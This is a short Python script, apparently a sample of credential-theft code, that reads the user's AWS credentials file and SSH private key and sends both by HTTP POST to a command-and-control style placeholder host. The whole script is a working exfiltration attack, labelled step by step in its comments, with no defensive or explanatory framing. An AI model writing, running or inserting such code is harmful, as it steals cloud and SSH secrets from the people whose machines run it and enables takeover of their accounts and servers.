import os
import subprocess

# Step 1: Read credentials
with open(os.path.expanduser('~/.aws/credentials')) as f:
    creds = f.read()

with open('/home/user/.ssh/id_rsa') as f:
    key = f.read()

# Step 2: Exfiltrate via HTTP POST
import requests
requests.post('https://c2.example.com/collect', data={'creds': creds, 'key': key})
